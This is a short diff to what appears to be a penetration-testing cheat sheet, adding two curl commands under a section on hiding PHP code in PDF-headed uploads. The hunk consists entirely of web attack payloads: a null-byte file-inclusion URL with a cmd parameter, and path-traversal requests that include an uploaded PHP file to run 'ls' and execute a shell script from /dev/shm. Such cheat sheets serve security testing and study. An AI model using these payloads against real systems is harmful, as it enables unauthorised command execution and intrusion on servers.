@@ -3313,6 +3313,8 @@ Create a file with a PDF header, which contains PHP code.
 
 ```c
 http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
+curl "http://localhost:8000/backend/index.php?view=../../../../../../../var/crash/test.php&cmd=ls"
+curl -G --data-urlencode "cmd=/dev/shm/ir.sh" http://localhost:8000/backend/index.php\?view\=../../../../../../../var/crash/test.php
 ```
 
 #### PHP Upload Filter Bypasses
